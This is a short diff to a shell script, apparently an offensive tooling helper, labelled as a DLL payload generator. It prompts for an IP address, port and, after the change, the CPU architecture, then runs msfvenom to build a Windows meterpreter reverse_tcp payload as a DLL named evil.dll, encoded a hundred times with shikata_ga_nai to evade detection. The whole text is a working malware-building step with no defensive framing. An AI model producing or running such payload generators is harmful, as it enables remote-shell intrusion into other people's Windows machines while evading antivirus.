@@ -1,4 +1,5 @@
 #DLL Payload Generator (reverse_TCP)
 read -p 'Enter IP: ' ip
 read -p 'Enter Port: ' pt
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$pt -e x64/shikata_ga_nai -i 100 -f dll > evil.dll
+read -p 'Enter bit(x86/x64): ' bt
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$pt -e $bt/shikata_ga_nai -i 100 -f dll > evil.dll
